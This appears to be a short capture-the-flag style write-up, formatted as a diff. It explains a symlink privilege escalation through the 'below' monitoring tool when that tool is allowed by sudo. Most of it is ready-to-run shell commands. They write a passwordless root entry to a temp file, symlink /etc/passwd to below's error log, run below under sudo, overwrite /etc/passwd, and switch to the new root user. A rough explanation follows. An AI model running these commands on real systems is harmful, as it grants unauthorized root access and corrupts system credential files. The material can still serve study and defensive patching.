@@ -1,0 +1,20 @@
+(ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*,
+        !/usr/bin/below -d*
+
+
+Its a clasic Symlink Privilege Escalation:
+
+You must find the file that simlinks with the /etc/passwd
+then:
+
+echo 'pwn::0:0:pwn:/root:/bin/bash' > /tmp/fakepass && rm -f /var/log/below/error_root.log && ln -s /etc/passwd /var/log/below/error_root.log && sudo /usr/bin/below
+
+exit the below program and type:
+
+cp /tmp/fakepass /var/log/below/error_root.log && su pwn
+
+
+
+So you created a fake file that has prev escal inside. You removed the error_root.log file that is symlinked with passwords (this file has the logs from below app)
+Then you simlink the passwd file with a new "error_....". You run this app, so the below put his logs at this new file that you can right on.
+and then you cp for payload file at this new file "error..." and just su at th new user
